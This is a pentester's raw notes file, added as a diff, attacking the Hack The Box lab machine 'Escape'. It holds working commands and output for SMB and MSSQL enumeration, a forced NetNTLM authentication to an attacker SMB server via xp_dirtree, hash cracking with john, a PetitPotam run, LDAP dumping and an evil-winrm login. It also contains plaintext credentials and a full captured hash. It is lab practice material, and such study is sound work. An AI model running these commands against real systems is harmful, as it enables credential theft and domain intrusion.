@@ -1,0 +1,284 @@
+2023-03-10 19:27:34 EST -- START TIME
+
+----------------------------------------
+
+|================================================================
+- Name: Escape
+- IP Address: 10.10.11.202
+- OS: Windows 10.0 Build 17763 x64
+- Notes: 
+// MS SQLServer Creds:
+// PublicUser : GuestUserCantWrite1
+
+//CREDS:
+// sql_svc : REGGIE1234ronnie
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.10.11.202
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49708,49712,60676
+
+2023-03-10 19:36:25 EST -- 
+nmap -e tun0 -Pn -A --script=default,vuln -p$ports $ip -oN 10.10.11.202_vuln.nmap
+
+
+# UDP scan
+2023-03-10 19:57:58 EST -- 
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN 10.10.11.202_udp.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// 445/tcp   open  microsoft-ds?
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-10 20:10:08 EST -- 
+crackmapexec smb 10.10.11.202 -u '' -p ''
+//SMB [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+//SMB [+] sequel.htb\:
+
+2023-03-10 20:18:41 EST -- 
+crackmapexec smb 10.10.11.202 -u '' -p '' -M zerologon
+//Nothing New
+
+2023-03-10 20:18:53 EST -- 
+crackmapexec smb 10.10.11.202 -u '' -p '' -M petitpotam
+//PETITPOT... 10.10.11.202    445    DC VULNERABLE
+//PETITPOT... 10.10.11.202    445    DC Next step: https://github.com/topotam/PetitPotam
+
+//For the completion!
+2023-03-10 20:21:33 EST -- 
+nmap -e tun0 -Pn -A --script=smb-* -p445 $ip -oN 10.10.11.202_smb.nmap
+
+//Enumerate null sessions
+crackmapexec smb 10.10.11.202 --pass-pol
+crackmapexec smb 10.10.11.202 --users
+//[-] Error enumerating domain users using dc ip 10.10.11.202: NTLM needs domain\username and a password
+crackmapexec smb 10.10.11.202 --groups
+//[-] Error enumerating domain users using dc ip 10.10.11.202: NTLM needs domain\username and a password
+
+//Enumerate anonymous logon
+//Adding 'x' and no password allows anon login to work correctly
+2023-03-10 20:54:25 EST -- 
+crackmapexec smb 10.10.11.202 -u 'x' -p ''
+//[+] sequel.htb\x:
+crackmapexec smb 10.10.11.202 -u 'x' -p '' --shares
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+IPC$            READ            Remote IPC
+NETLOGON                        Logon server share 
+Public          READ            
+SYSVOL                          Logon server share
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// SMB-Client
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-10 20:54:30 EST -- 
+impacket-smbclient -no-pass x@10.10.11.202
+
+# info
+[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+# who
+[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Public
+SYSVOL
+
+# use ADMIN$
+[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+# use C$
+[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+# use Public
+# ls
+drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 .
+drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 ..
+-rw-rw-rw-      49551  Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf
+
+//Found possible creds in 'SQL Server Procedures.pdf' document
+//For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user PublicUser and password GuestUserCantWrite1.
+//Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
+PublicUser : GuestUserCantWrite1
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// 1433/tcp  open  ms-sql-s	Microsoft SQL Server 2019 15.00.2000.00
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-10 21:38:31 EST -- 
+crackmapexec mssql 10.10.11.202 -u PublicUser -p GuestUserCantWrite1
+//[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sequel\Guest'.
+
+2023-03-10 21:59:08 EST -- 
+nmap -e tun0 -Pn -A --script=ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=PublicUser,mssql.password=GuestUserCantWrite1 -sV -p 1433 10.10.11.202
+//Nothing
+
+2023-03-10 22:04:21 EST -- 
+impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202
+enable_xp_cmdshell
+//[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
+//[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
+//[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+//[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
+
+# Get version
+SQL> SELECT @@version;
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+
+# Get user
+SQL> SELECT user_name();
+guest
+
+# Get databases
+SELECT name FROM master.dbo.sysdatabases;
+master
+tempdb
+model
+msdb
+
+#Get table names
+SELECT * FROM tempdb.INFORMATION_SCHEMA.TABLES;
+TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE
+tempdb			dbo				#A4C4CDDB	 b'BASE TABLE'
+
+#List Linked Servers
+EXEC sp_linkedservers;
+SRV_NAME SRV_PROVIDERNAME SRV_PRODUCT SRV_DATASOURCE SRV_PROVIDERSTRING	SRV_LOCATION SRV_CAT
+DC\SQLMOCK	SQLNCLI		  SQL Server  DC\SQLMOCK	 NULL				NULL		 NULL
+
+#List users
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+
+login		login_type
+PublicUser	SQL_LOGIN
+sa			SQL_LOGIN
+
+// Steal NetNTLM hash / Relay attack
+//https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+cd /home/kali/haxterm/data/10.10.11.202
+touch test.txt
+
+// Start a SMB server to capture the hash used in the authentication
+impacket-smbserver -smb2support PUBLIC .
+
+2023-03-10 23:41:17 EST -- 
+impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.20
+xp_dirtree '\\10.10.14.199\test.txt'
+
+// Info
+[*] Incoming connection (10.10.11.202,54596)
+[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
+[*] User DC\sql_svc authenticated successfully
+[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:07854f24684d47523a91ed10c06fb062:010100000000000000f0fdafd353d9013f15de46496882380000000001001000770070007a0071006d006e0064004b0003001000770070007a0071006d006e0064004b000200100075007900420068004400620068006f000400100075007900420068004400620068006f000700080000f0fdafd353d901060004000200000008003000300000000000000000000000003000008eb084490d7c486da3c43f54fceed1cc70f823186ac72ad9fd4eca0c171475000a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390039000000000000000000
+
+//Crack NetNTLM hash
+2023-03-10 23:50:13 EST -- 
+echo 'sql_svc::sequel:aaaaaaaaaaaaaaaa:07854f24684d47523a91ed10c06fb062:010100000000000000f0fdafd353d9013f15de46496882380000000001001000770070007a0071006d006e0064004b0003001000770070007a0071006d006e0064004b000200100075007900420068004400620068006f000400100075007900420068004400620068006f000700080000f0fdafd353d901060004000200000008003000300000000000000000000000003000008eb084490d7c486da3c43f54fceed1cc70f823186ac72ad9fd4eca0c171475000a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390039000000000000000000' > sql_svc.hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc.hash
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+//REGGIE1234ronnie (sql_svc)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// EXPLOIT: PetitPotem [FAIL]
+// Petitpotam is a vulnerability that allows a domain user to take over domain controllers through triggering authentications using the MS-EFSRPC protocol.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
+
+2023-03-10 23:56:23 EST -- 
+python3 PetitPotam.py -u sql_svc -p REGGIE1234ronnie 10.10.14.199 10.10.11.202
+[-] Connecting to ncacn_np:10.10.11.202[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+
+//Did not work. 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// LoginTest
+// sql_svc : REGGIE1234ronnie
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-11 00:05:55 EST -- 
+crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+// [+] sequel.htb\sql_svc:REGGIE1234ronnie
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//ldapdomaindump
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-11 00:10:57 EST -- 
+ldapdomaindump -u 'sequel.htb\sql_svc' -p 'REGGIE1234ronnie' -o ldap_dump ldaps://10.10.11.202
+
+2023-03-11 00:16:09 EST -- 
+firefox-esr domain_users.html
+
+//Remote Management Users
+sql_svc
+Ryan.Cooper
+//Domain Admins
+Administrator
+
+2023-03-11 00:16:11 EST -- 
+firefox-esr domain_policy.html
+
+//Machine Account Quota = 0
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
+
+// evil-winrm
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// connect
+2023-03-11 00:18:29 EST -- 
+evil-winrm -i 10.10.11.202 -P 5985 -u 'sql_svc' -p 'REGGIE1234ronnie'
+
+
+// connect with scripts enabled (-s) and .Net exes enabled (-e)
+evil-winrm -i <IPADDRESS> -P <PORT> -u <USER> -p <PASSWORD> -s /path/to/Powershell/scripts -e /path/to/dotnet/exes
+
+
+// how to use evil-winrm scripts example (NOTE: Windows Defender can block)
+Get-PassHashes.ps1
+Get-PassHashes
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+
+
